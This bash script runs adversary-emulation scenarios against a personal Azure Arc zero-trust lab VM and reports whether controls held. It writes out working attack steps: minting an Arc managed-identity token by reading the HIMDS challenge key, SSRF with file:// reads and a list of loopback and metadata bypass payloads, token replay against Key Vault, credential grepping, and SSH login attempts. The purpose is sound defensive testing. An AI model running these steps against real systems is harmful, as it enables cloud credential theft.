#!/usr/bin/env bash
# Adversary emulation against the hybrid lab. Run from the LAPTOP (Git Bash / WSL) after:
#   local-lab/create-vm.ps1  ->  scripts/01-deploy.sh  ->  local-lab/arc-onboard.sh  ->  app installed
#
#   ./attacks/run-attacks.sh            # all scenarios
#   ./attacks/run-attacks.sh a03        # one scenario
#
# Every scenario prints EXPECTED vs OBSERVED and PASS (control held) / FAIL (finding).
# Output is tee'd to .state/attacks-<timestamp>.txt for evidence (redacted by 04-evidence.sh).
source "$(dirname "$0")/../scripts/lib.sh"
require_login
load_outputs

VM_IP="${VM_IP:-192.168.56.10}"
KEY=".state/vbox/zt_lab_ed25519"
SSH_OPTS=(-i "$KEY" -o UserKnownHostsFile=.state/vbox/known_hosts -o StrictHostKeyChecking=accept-new -o ConnectTimeout=8 -o BatchMode=yes)
as()   { local u="$1"; shift; ssh "${SSH_OPTS[@]}" "$u@$VM_IP" "$@"; }
APP="http://$VM_IP:8080"
RUN="$STATE/attacks-$(date +%Y%m%dT%H%M%S).txt"
exec > >(tee "$RUN") 2>&1

banner() { printf '\n\033[1;35m### %s\033[0m\n%s\n' "$1" "$2"; }
check()  { # description expected-substring observed
  if [[ "$3" == *"$2"* ]]; then pass "$1"; else fail "$1  (expected '$2', observed: ${3:0:160})"; fi; }

a01() {
  banner "A01 Insider: low-privilege user tries to mint an Arc token" \
    "ATT&CK T1528 · threat T16 · controls AC-6, IA-9 · expect: challenge path visible, key file unreadable, no token"
  out=$(as intern 'R=$(curl -s -D - -o /dev/null -H Metadata:true "http://localhost:40342/metadata/identity/oauth2/token?api-version=2020-06-01&resource=https://vault.azure.net" | grep -i ^WWW-Authenticate | sed "s/.*realm=//" | tr -d "\r"); echo "realm=$R"; cat "$R" 2>&1 | head -1')
  echo "$out"
  check "intern cannot read the Arc challenge key" "Permission denied" "$out"
}

a02() {
  banner "A02 Credential hunting on disk and in process memory" \
    "ATT&CK T1552.001, T1552.007 · threat T01 · controls IA-5(7) · expect: no secret material anywhere"
  out=$(as intern 'grep -rIiE "password|secret|AccountKey|client_secret|BEGIN .*PRIVATE" /opt/zt-app /etc/zt-app /etc/environment 2>&1 | grep -v "Permission denied" | head; echo "---environ"; cat /proc/$(pgrep -u ztapp -f zt_app.py | head -1)/environ 2>&1 | head -c 200')
  echo "$out"
  check "app process environment unreadable to other users" "Permission denied" "$out"
  hits=$(echo "$out" | grep -cE "AccountKey=|client_secret *=|PRIVATE KEY" || true)
  check "no credential strings found" "0" "$hits"
}

a03() {
  banner "A03 SSRF -> steal the workload identity (OWASP A10)" \
    "ATT&CK T1190 → T1528 · threat T17 · controls SC-7, SI-10 · app restarted with ZT_VULN_SSRF=1 for this test"
  as ztadmin "sudo sed -i 's/^ZT_VULN_SSRF=.*/ZT_VULN_SSRF=1/' /etc/zt-app/app.env && sudo systemctl restart zt-app" && sleep 2
  enc() { "$PY" -c 'import sys,urllib.parse; print(urllib.parse.quote(sys.argv[1], safe=""))' "$1"; }
  step1=$(curl -s "$APP/fetch?url=$(enc 'http://localhost:40342/metadata/identity/oauth2/token?api-version=2020-06-01&resource=https://vault.azure.net')")
  echo "step 1 (HIMDS via SSRF): $step1"
  check "HIMDS answers SSRF with a 401 challenge, not a token" '"status": 401' "$step1"
  realm=$(echo "$step1" | "$PY" -c 'import sys,json; print((json.load(sys.stdin).get("www_authenticate") or "").split("realm=")[-1])')
  step2=$(curl -s "$APP/fetch?url=$(enc "file://$realm")")
  # Never print the key itself - only whether the read worked.
  leaked=$(echo "$step2" | "$PY" -c 'import sys,json; d=json.load(sys.stdin); b=d.get("body") or ""; print("yes" if b and "error" not in d else "no")')
  echo "step 2 (file:// read of the key via SSRF): key readable = $leaked"
  if [[ "$leaked" == "yes" ]]; then
    warn "FINDING F-005: SSRF reads the Arc challenge key via file:// (app is in group himds). Fix: allow-list URL schemes/hosts."
  else
    pass "file:// blocked - challenge key not readable through SSRF"
  fi
  step3=$(curl -s -H "Authorization: Basic stolen" "$APP/fetch?url=$(enc 'http://localhost:40342/metadata/identity/oauth2/token?api-version=2020-06-01&resource=https://vault.azure.net')")
  check "attacker cannot add the Authorization header through SSRF -> still no token" '"status": 401' "$step3"
  as ztadmin "sudo sed -i 's/^ZT_VULN_SSRF=.*/ZT_VULN_SSRF=0/' /etc/zt-app/app.env && sudo systemctl restart zt-app"
  sleep 2
  check "vulnerable endpoint disabled again" '"not found"' "$(curl -s "$APP/fetch?url=http://example.com")"
}

a04() {
  banner "A04 Assume breach: attacker is ROOT on the server — what is the blast radius?" \
    "ATT&CK T1555.006, T1098.003 · threats T03, T04 · controls AC-6, AC-6(10) · expect: 1 secret readable, everything else 403"
  scp "${SSH_OPTS[@]}" -q scripts/vm/probe.sh "ztadmin@$VM_IP:/tmp/probe.sh"
  out=$(as ztadmin "sudo bash /tmp/probe.sh none $OUT_keyVaultName $SUB_ID $OUT_appSecretName $OUT_decoySecretName; rm -f /tmp/probe.sh")
  echo "$out" | tee "$STATE/probes-arc.txt"
  check "root gets a token (expected: it IS the workload)" "imds_token http=200" "$out"
  check "can read app secret (by design)"                  "read_app_secret http=200" "$out"
  check "cannot read decoy secret"                         "read_decoy_secret http=403" "$out"
  check "cannot list secrets"                              "list_secrets http=403" "$out"
  check "cannot overwrite secret"                          "write_secret http=403" "$out"
  check "cannot delete secret"                             "delete_secret http=403" "$out"
  check "sees zero resource groups (ARM filters lists)"   "arm_list_rgs http=200 items=0" "$out"
  check "cannot read the resource group"                  "arm_read_rg http=403" "$out"
  check "cannot grant itself Owner (escalation)"          "arm_escalate_owner http=403" "$out"
  check "cannot read the directory"                        "graph_list_users http=403" "$out"
  echo "(internet_egress is informational on-prem: no egress filtering on a home NAT -> RISK-08)"
}

a05() {
  banner "A05 Token theft & replay from another machine" \
    "ATT&CK T1528, T1550.001 · threat T02 · control SC-7 · expect: works from the SAME public IP (finding), fails elsewhere"
  tok=$(as ztadmin 'sudo bash -c '"'"'R=$(curl -s -D - -o /dev/null -H Metadata:true "http://localhost:40342/metadata/identity/oauth2/token?api-version=2020-06-01&resource=https://vault.azure.net" | grep -i ^WWW-Authenticate | sed "s/.*realm=//" | tr -d "\r"); curl -s -H Metadata:true -H "Authorization: Basic $(cat $R)" "http://localhost:40342/metadata/identity/oauth2/token?api-version=2020-06-01&resource=https://vault.azure.net"'"'"'' \
        | "$PY" -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')
  echo "stolen token: ${tok:0:12}… (len ${#tok}) — exfiltrated to the laptop"
  code=$(curl -s -o "$DEVNULL" -w '%{http_code}' -H "Authorization: Bearer $tok" "${OUT_keyVaultUri%/}/secrets/$OUT_appSecretName?api-version=7.4")
  echo "replay from laptop (same home public IP as the VM): http=$code"
  if [[ "$code" == "200" ]]; then
    warn "FINDING (expected): IP allow-list cannot tell the VM from other devices behind the same home NAT -> RISK-08"
  fi
  code2=$(curl -s -o "$DEVNULL" -w '%{http_code}' -H "Authorization: Bearer $tok" "${OUT_keyVaultUri%/}/secrets/$OUT_decoySecretName?api-version=7.4")
  check "stolen token still cannot read the decoy" "403" "$code2"
  echo "Manual: paste the token into Azure Cloud Shell and repeat -> expect 403 ForbiddenByFirewall."
  echo "Detection: queries/kv-secret-reads-by-identity.kql shows the read with CallerIPAddress + identity oid."
}

a06() {
  banner "A06 SSH brute force from the lab network (runs last: it bans the laptop for 2 min)"     "ATT&CK T1110 · threat T11 · controls AC-7, IA-2 · expect: password + unknown keys refused, fail2ban bans source"
  [[ -f "$STATE/vbox/attacker_key" ]] || ssh-keygen -t ed25519 -N "" -q -f "$STATE/vbox/attacker_key"
  check "password authentication is not even offered" "Permission denied (publickey)"     "$(ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no -o BatchMode=yes -o ConnectTimeout=5 -o UserKnownHostsFile=.state/vbox/known_hosts intern@$VM_IP true 2>&1 || true)"
  for u in root admin intern ztadmin ubuntu; do   # each attempt is EXPECTED to fail
    ssh -i "$STATE/vbox/attacker_key" -o IdentitiesOnly=yes -o BatchMode=yes -o ConnectTimeout=5         -o UserKnownHostsFile=.state/vbox/known_hosts "$u@$VM_IP" true 2>&1 | tail -1 || true
  done
  out=$(ssh -i "$KEY" -o BatchMode=yes -o ConnectTimeout=5 -o UserKnownHostsFile=.state/vbox/known_hosts "ztadmin@$VM_IP" true 2>&1 || true)
  check "fail2ban now blocks the attacker IP (even with a valid key)" "" "$out"
  [[ -n "$out" ]] && pass "banned: '$out'" || warn "not banned (check: sudo fail2ban-client status sshd)"
  echo "waiting 130s for the 2-minute ban to expire..."; sleep 130
  out=$(as ztadmin "sudo fail2ban-client status sshd | grep -E 'Total failed|Total banned'")
  echo "$out"
  check "ban was recorded by fail2ban" "Total banned" "$out"
}

a08() {
  banner "A08 Re-test F-005 after the fix (ZT_VULN_SSRF=2: scheme allow-list, internal-IP block, no redirects)" \
    "OWASP SSRF Prevention Cheat Sheet · threat T17 · control SI-10 · expect: every internal target blocked with 400"
  as ztadmin "sudo sed -i 's/^ZT_VULN_SSRF=.*/ZT_VULN_SSRF=2/' /etc/zt-app/app.env && sudo systemctl restart zt-app" && sleep 2
  enc() { "$PY" -c 'import sys,urllib.parse; print(urllib.parse.quote(sys.argv[1], safe=""))' "$1"; }
  for target in "file:///var/opt/azcmagent/tokens/x.key" \
                "http://localhost:40342/metadata/identity/oauth2/token?api-version=2020-06-01&resource=https://vault.azure.net" \
                "http://127.0.0.1:40342/" "http://2130706433:40342/" "http://[::1]:40342/" \
                "http://169.254.169.254/metadata/instance" "http://192.168.56.1/" "gopher://localhost:40342/"; do
    r=$(curl -s "$APP/fetch?url=$(enc "$target")")
    check "blocked: ${target:0:60}" '"error": "blocked"' "$r"
  done
  r=$(curl -s "$APP/fetch?url=$(enc https://example.com)")
  check "legitimate external URL still works" '"status": 200' "$r"
  as ztadmin "sudo sed -i 's/^ZT_VULN_SSRF=.*/ZT_VULN_SSRF=0/' /etc/zt-app/app.env && sudo systemctl restart zt-app"
  sleep 2
}

a07() {
  banner "A07 Local privilege escalation attempts by the insider" \
    "ATT&CK T1548.003, T1098 · threat T16 · controls AC-6, AU-12 · expect: denied and audited"
  out=$(as intern 'sudo -n true 2>&1; echo "---"; groups; echo "---"; ls -l /var/opt/azcmagent/tokens 2>&1 | head -3')
  echo "$out"
  check "no sudo for intern" "password is required" "$out"
  audit=$(as ztadmin "sudo ausearch --input-logs -k access_denied -ua intern -ts today -i 2>/dev/null | grep -c 'azcmagent/tokens' || true")
  echo "auditd 'access_denied' records of intern hitting Arc's token dir today: $audit"
  [[ "${audit:-0}" -ge 1 ]] && pass "attempts were audited (AU-12)" || warn "no audit hit (run a01 first)"
}

SCENARIOS=(a01 a02 a03 a08 a04 a05 a07 a06)   # a06 last: it bans the laptop briefly
[[ $# -gt 0 ]] && SCENARIOS=("$@")
for s in "${SCENARIOS[@]}"; do "$s"; done
echo; echo "Transcript: $RUN"
summary
